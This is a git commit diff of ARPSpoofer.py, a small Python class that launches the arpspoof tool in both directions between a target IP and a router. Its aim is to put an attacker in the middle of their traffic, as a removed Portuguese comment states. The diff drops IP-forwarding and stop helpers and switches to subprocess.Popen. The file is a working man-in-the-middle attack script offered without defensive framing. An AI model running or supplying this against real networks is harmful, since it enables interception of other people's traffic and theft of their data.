dca42cb9451820b825f97eaaa5715fb0c5de1062
larilaier <107729339+larilaier@users.noreply.github.com>
2024-11-06 15:53:00 -0300

    Update ARPSpoofer.py

--- ARPSpoofer.py
+++ ARPSpoofer.py
@@ -1,4 +1,4 @@
-import os
+import subprocess
 
 class ARPSpoofer:
     def __init__(self, target_ip, router_ip, interface="eth0"):
@@ -6,14 +6,6 @@ class ARPSpoofer:
         self.router_ip = router_ip
         self.interface = interface
 
-    def enable_ip_forwarding(self):
-        os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
-
     def start_spoofing(self):
-        os.system(f"sudo arpspoof -i {self.interface} -t {self.target_ip} {self.router_ip} &")
-        os.system(f"sudo arpspoof -i {self.interface} -t {self.router_ip} {self.target_ip} &")
-
-    def stop_spoofing(self):
-        os.system("pkill arpspoof")
-
-#executar o ataque de ARP Spoofing, para que o atacante se interponha na comunicação entre alvo-roteador.
+        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.target_ip, self.router_ip])
+        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.router_ip, self.target_ip])
